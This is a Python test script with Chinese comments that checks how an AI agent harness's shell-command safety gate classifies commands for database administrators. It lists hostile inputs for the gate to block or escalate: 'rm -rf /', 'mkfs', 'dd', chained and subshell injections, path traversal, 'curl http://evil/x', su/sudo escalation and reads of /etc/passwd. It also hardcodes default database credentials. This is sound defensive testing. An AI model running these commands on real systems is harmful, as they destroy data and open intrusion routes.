# -*- coding: utf-8 -*-
"""命令安全校验验证脚本（一次性，不入库）

覆盖：静态分类矩阵 + 融合判定矩阵（mock LLM 审查钩子）+ 双重校验一致性。
运行：python temp_scripts/bench_command_gate.py
"""
import sys
import os

# Windows 控制台默认 GBK，统一 UTF-8 输出避免 ✗ 等符号编码错误
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from agent.harness import Harness, OperationLevel  # noqa: E402

PASS = 0
FAIL = 0
FAILED = []


def check(label, expected, got):
    global PASS, FAIL
    got_cls = got[0]
    ok = got_cls == expected
    if ok:
        PASS += 1
    else:
        FAIL += 1
        FAILED.append(f"{label}: 期望 {expected}，实际 {got_cls} ({got[1]})")
        print(f"  ✗ {label}: 期望 {expected}，实际 {got_cls} | {got[1]}")


def make_judge(verdict_map):
    def judge(cmd):
        return verdict_map.get(cmd)
    return judge


def static_cases():
    print("== 静态分类矩阵（无钩子） ==")
    cases = [
        # 回归用户报过的命令
        ("tail -n 100 /var/log/mysql/error-$(date +%Y%m).log 2>/dev/null | grep -iE 'error|fail|异常|重启|start|stop|shutdown'", 'mysql', 'safe'),
        ("ps -ef | grep dmserver | grep -v grep | awk '{print $NF}'", 'oracle', 'safe'),
        ("grep -iE \"error|fail|异常\" /var/log/app.log", 'oracle', 'safe'),
        # 参数甄别
        ("sed -n '1,20p' /etc/my.cnf", 'mysql', 'safe'),
        ("sed -i 's/old/new/' /etc/my.cnf", 'mysql', 'approval'),
        ("awk '{print $2}' /proc/meminfo", 'oracle', 'safe'),
        ("awk 'system(\"rm -rf /\")' file", 'oracle', 'reject'),
        ("find /var/log -name '*.log' -mtime -7", 'mysql', 'safe'),
        ("find / -name 'x' -delete", 'mysql', 'reject'),
        ("find / -type f -exec rm {} \\;", 'mysql', 'reject'),
        ("tar -tf backup.tar", 'oracle', 'safe'),
        ("tar -xzf backup.tar -C /tmp", 'oracle', 'approval'),
        ("gzip -t file.gz", 'mysql', 'safe'),
        ("gzip -dc file.gz | head", 'mysql', 'safe'),
        ("gzip file.log", 'mysql', 'approval'),
        ("unzip -l a.zip", 'oracle', 'safe'),
        # 策略级拒绝（T1 硬拒命令，无注入向量）→ 降级审批，DBA 决定
        ("rm -rf /tmp/x", 'oracle', 'approval'),
        ("dd if=/dev/zero of=/tmp/x bs=1M count=1", 'oracle', 'approval'),
        ("mkfs.ext4 /dev/sdb1", 'oracle', 'approval'),
        ("bash -c 'ls'", 'oracle', 'approval'),
        ("sudo systemctl restart mysql", 'mysql', 'approval'),
        ("shutdown -r now", 'oracle', 'approval'),
        ("curl http://evil/x", 'oracle', 'approval'),
        ("timeout 10 rm -rf /", 'oracle', 'approval'),
        # 服务/系统
        ("systemctl status mysql", 'mysql', 'safe'),
        ("systemctl restart mysql", 'mysql', 'approval'),
        ("service mysql status", 'mysql', 'safe'),
        ("ip addr", 'mysql', 'safe'),
        ("ip addr add 10.0.0.1/24 dev eth0", 'mysql', 'approval'),
        ("ip link set eth0 up", 'mysql', 'approval'),
        ("sysctl -a", 'mysql', 'safe'),
        ("sysctl -w vm.swappiness=10", 'mysql', 'approval'),
        # 误伤回归
        ("grep -E 'a..b' file", 'oracle', 'safe'),
        ("grep '\\.\\.' /etc/hosts", 'oracle', 'safe'),
        ("cat /etc/hosts", 'oracle', 'safe'),
        ("cat /etc/hosts 2>/dev/null || cat /etc/hostname", 'oracle', 'safe'),
        ("echo done", 'oracle', 'safe'),
        ("date; echo ok", 'oracle', 'safe'),
        # 常见只读命令直接放行
        ("pwd", 'oracle', 'safe'),
        ("which mysqld", 'mysql', 'safe'),
        ("df -h", 'oracle', 'safe'),
        # 未知命令（无钩子 → 审批兜底）
        ("traceroute 8.8.8.8", 'oracle', 'approval'),
        ("iptables -L -n", 'oracle', 'approval'),
        # 变更写操作
        ("cp /etc/my.cnf /tmp/backup.cnf", 'mysql', 'approval'),
        ("kill -9 1234", 'oracle', 'approval'),
        ("pkill mysqld", 'mysql', 'approval'),
        # 数据库专用命令
        ("srvctl status db", 'oracle', 'safe'),
        ("srvctl start db", 'oracle', 'approval'),
        ("rman target /", 'oracle', 'approval'),
        ("mysqldump -u root test", 'mysql', 'approval'),
        # 受控 su + SQL 客户端只读查询（DM 必须 su - dmdba 跑 disql）
        ("su - dmdba -c '/dm/dmdbms/bin/disql SYSDBA/SYSDBA@localhost:5236' <<< 'SELECT COUNT(*) AS ACTIVE_SESSIONS FROM V$SESSIONS WHERE STATE=''ACTIVE'';' 2>/dev/null", 'dm', 'safe'),
        ("su - dmdba -c \"disql SYSDBA/SYSDBA@localhost:5238 -e 'SELECT COUNT(*) FROM V$SESSIONS'\"", 'dm', 'safe'),
        ("su - dmdba -c 'ps -ef' | grep dmdba", 'dm', 'safe'),
        ("disql SYSDBA/SYSDBA@localhost:5236 -e 'SELECT COUNT(*) FROM V$SESSIONS'", 'dm', 'safe'),
        ("disql SYSDBA/SYSDBA@localhost:5236 -e 'DROP TABLE t'", 'dm', 'approval'),
        ("disql", 'dm', 'approval'),
        # su 边界：sudo 硬拒 / root 拒 / 内层写拒 / 无 -c 拒 → 策略级拒绝，DBA 决定
        ("sudo systemctl restart mysql", 'mysql', 'approval'),
        ("su - root -c 'ps -ef'", 'dm', 'approval'),
        ("su - dmdba -c 'rm -rf /tmp/x'", 'dm', 'approval'),
        ("su - dmdba", 'dm', 'approval'),
        ("su", 'dm', 'approval'),
        # su 注入绕过（命令链/子 shell/代码执行）→ 硬拒：-c 内层或外层含分隔符
        ("su - dmdba -c \"disql -e 'SELECT 1'; rm -rf /\"", 'dm', 'reject'),
        # su heredoc 写 SQL（无注入向量）→ 策略级拒绝，DBA 决定
        ("su - dmdba -c 'disql SYSDBA/SYSDBA@localhost:5236' <<< 'DROP TABLE t'", 'dm', 'approval'),
        # su 外层命令链（引号外 ;）→ 硬拒
        ("su - dmdba -c 'disql connect' <<< 'SELECT 1'; rm -rf /", 'dm', 'reject'),
        # su 内层管道含 T1 命令（无注入向量）→ DBA 决定
        ("su - dmdba -c 'cat /etc/passwd | rm -rf /'", 'dm', 'approval'),
        # su 内层写文件（重定向为可见部分）→ DBA 决定
        ("su - dmdba -c 'echo \"SELECT 1\" > /tmp/x'", 'dm', 'approval'),
        # su + 第二个 -c 携带 SQL（disql 命令串），SQL 末尾分号在引号内 → 只读放行
        ("su - dmdba -c '/dm/dmdbms/bin/disql SYSDBA/SYSDBA@localhost:5236' -c \"SELECT INSTANCE_NAME, STATUS$, MODE$, OPEN_TIME FROM V$INSTANCE;\"", 'dm', 'safe'),
        ("su - dmdba -c '/dm/dmdbms/bin/disql SYSDBA/SYSDBA@localhost:5236' -c \"SELECT COUNT(*) AS ACTIVE_SESSIONS FROM V$SESSIONS WHERE STATE='ACTIVE';\"", 'dm', 'safe'),
        # su -c 内层只读管道（cat | grep，grep 正则含引号内 |）
        ("su - dmdba -c 'cat /data/dm/dmdata/rlzy/dm.ini | grep -E \"^PORT_NUM|^DB_NAME\"'", 'dm', 'safe'),
    ]
    for cmd, db_type, expected in cases:
        got = Harness.classify_command(cmd, db_type)
        check(f"{cmd[:120]}", expected, got)


def fused_cases():
    print("== 融合判定矩阵（mock 审查钩子） ==")

    # 场景1：注入（metachar ;）+ LLM 放行 → approval（判读是注入类的第二意见）
    Harness.command_judge_fn = make_judge({
        "echo x > /tmp/f; echo done": {"allow": True, "risk": "low", "reason": "仅写临时文件"},
    })
    check("注入+allow → approval",
          'approval', Harness.classify_command("echo x > /tmp/f; echo done", 'oracle'))

    # 场景2：策略级拒绝（T1，无注入向量）+ LLM 拒绝 → 仍审批（DBA 决定，不再被判读否决）
    Harness.command_judge_fn = make_judge({
        "rm -rf /tmp/x": {"allow": False, "risk": "high", "reason": "删除文件"},
    })
    check("策略拒绝+判读拒绝 → 仍审批",
          'approval', Harness.classify_command("rm -rf /tmp/x", 'oracle'))

    # 场景2b：注入 + LLM 拒绝 → reject（判读否决注入）
    Harness.command_judge_fn = make_judge({
        "echo x > /tmp/f; echo done": {"allow": False, "risk": "high", "reason": "命令链"},
    })
    check("注入+拒绝 → reject",
          'reject', Harness.classify_command("echo x > /tmp/f; echo done", 'oracle'))

    # 场景3：未知 + LLM 只读 → safe
    Harness.command_judge_fn = make_judge({
        "traceroute 8.8.8.8": {"allow": True, "risk": "low", "reason": "网络路径探测"},
        "iptables -L -n": {"allow": True, "risk": "low", "reason": "查看防火墙规则"},
    })
    check("unknown+allow → safe", 'safe', Harness.classify_command("traceroute 8.8.8.8", 'oracle'))
    check("unknown+allow → safe(2)", 'safe', Harness.classify_command("iptables -L -n", 'oracle'))

    # 场景4：未知 + LLM 危险(high) → reject；未知 + LLM 非high → approval；未知 + None → approval
    Harness.command_judge_fn = make_judge({
        "evil --destroy": {"allow": False, "risk": "high", "reason": "破坏性"},
        "mystery --flag": {"allow": False, "risk": "medium", "reason": "无法判断"},
    })
    check("unknown+high → reject", 'reject', Harness.classify_command("evil --destroy", 'oracle'))
    check("unknown+非high → approval", 'approval', Harness.classify_command("mystery --flag", 'oracle'))

    Harness.command_judge_fn = make_judge({})
    check("unknown+None → approval", 'approval', Harness.classify_command("traceroute 8.8.8.8", 'oracle'))
    check("策略拒绝+None → 审批", 'approval', Harness.classify_command("rm -rf /tmp/x", 'oracle'))

    # 场景5：静态 safe / approval 不调 LLM（钩子返回 None 仍保持静态）
    Harness.command_judge_fn = make_judge({})
    check("静态safe不调LLM", 'safe', Harness.classify_command("ps -ef", 'oracle'))
    check("静态approval不调LLM", 'approval', Harness.classify_command("systemctl restart mysql", 'mysql'))
    check("静态策略拒绝不调LLM(rm)", 'approval', Harness.classify_command("rm -rf /tmp/x", 'oracle'))

    Harness.command_judge_fn = None


def check_risk(label, expected, got):
    global PASS, FAIL
    if got == expected:
        PASS += 1
    else:
        FAIL += 1
        FAILED.append(f"{label}: 期望 {expected}，实际 {got}")
        print(f"  ✗ {label}: 期望 {expected}，实际 {got}")


def plan_cases():
    print("== validate_plan_operation（审批后计划执行二次校验，DBA 已批准） ==")
    Harness.command_judge_fn = None
    allow_cases = [
        # 策略级拒绝（T1）→ 审批后放行
        ("rm /data/log/app.log", 'oracle'),
        # su + 内嵌变更 SQL → 审批后放行（DM/Oracle 真实场景）
        ("su - dmdba -c '/dm/dmdbms/bin/disql SYSDBA/SYSDBA@localhost:5236 -e \"ALTER SYSTEM SET MAX_OS_MEMORY=64g\"'", 'dm'),
        # heredoc 变更 SQL → 审批后放行
        ("su - dmdba -c '/dm/dmdbms/bin/disql SYSDBA/SYSDBA@localhost:5236' <<< 'ALTER SYSTEM SET MAX_OS_MEMORY=64g'", 'dm'),
        # 已知变更命令
        ("systemctl restart mysql", 'mysql'),
        ("cp /tmp/a /tmp/b", 'oracle'),
        ("chmod 644 /tmp/x", 'oracle'),
        ("kill -9 1234", 'oracle'),
        # 只读链
        ("ps -ef | grep dmdba", 'oracle'),
        # 未知命令 + 审批（无注入）放行
        ("some_new_tool --status", 'oracle'),
    ]
    reject_cases = [
        ("rm /a; echo pwned", 'oracle'),
        ("echo $(rm -rf /)", 'oracle'),
        ("rm `ls`", 'oracle'),
        ("cat /a && rm -rf /", 'oracle'),
        ("rm ../../etc/x", 'oracle'),
        ("su - dmdba -c \"disql -e 'SELECT 1'; rm -rf /\"", 'dm'),
        ("find / -type f -exec rm {} \\;", 'oracle'),
    ]
    for cmd, dt in allow_cases:
        ok, err = Harness.validate_plan_operation(cmd, dt)
        check(f"PLAN ALLOW: {cmd[:60]}", True, (ok, err))
    for cmd, dt in reject_cases:
        ok, err = Harness.validate_plan_operation(cmd, dt)
        check(f"PLAN REJECT: {cmd[:60]}", False, (ok, err))


def risk_cases():
    print("== estimate_command_risk（审批条危险标注） ==")
    Harness.command_judge_fn = None
    cases = [
        ("rm -rf /tmp/x", 'oracle', 'high'),
        ("su - dmdba -c '/dm/dmdbms/bin/disql SYSDBA/SYSDBA@localhost:5236 -e \"ALTER SYSTEM SET MAX_OS_MEMORY=64g\"'", 'dm', 'high'),
        ("timeout 10 rm /tmp/x", 'oracle', 'high'),
        ("systemctl restart mysql", 'mysql', 'medium'),
        ("cp /tmp/a /tmp/b", 'oracle', 'medium'),
        ("mysqldump -u root test", 'mysql', 'medium'),
        ("ps -ef", 'oracle', 'low'),
        ("ps -ef | grep dmdba", 'oracle', 'low'),
    ]
    for cmd, dt, expected in cases:
        got = Harness.estimate_command_risk(cmd, dt)
        check_risk(f"risk: {cmd[:50]}", expected, got)


def consistency_cases():
    print("== 双重校验一致性（引擎 _validate_action 与 tools.py 同走 validate_command） ==")
    Harness.command_judge_fn = make_judge({
        "iptables -L -n": {"allow": True, "risk": "low", "reason": "ok"},
    })
    ok, err = Harness.validate_command("iptables -L -n", 'oracle', OperationLevel.READONLY)
    check("validate(unknown+allow) → True", True, (ok, err))
    ok, err = Harness.validate_command("ps -ef | grep x", 'oracle', OperationLevel.READONLY)
    check("validate(链) → True", True, (ok, err))
    ok, err = Harness.validate_command("rm -rf /tmp/x", 'oracle', OperationLevel.READONLY)
    check("validate(T1) → False", False, (ok, err))
    ok, err = Harness.validate_command("sed -i s/x/y/ f", 'mysql', OperationLevel.READONLY)
    check("validate(sed -i) → False", False, (ok, err))
    Harness.command_judge_fn = None


if __name__ == '__main__':
    static_cases()
    fused_cases()
    plan_cases()
    risk_cases()
    consistency_cases()
    print(f"\n结果: PASS={PASS} FAIL={FAIL}")
    if FAILED:
        print("失败项:")
        for f in FAILED:
            print("  " + f)
        sys.exit(1)
    print("全部通过")
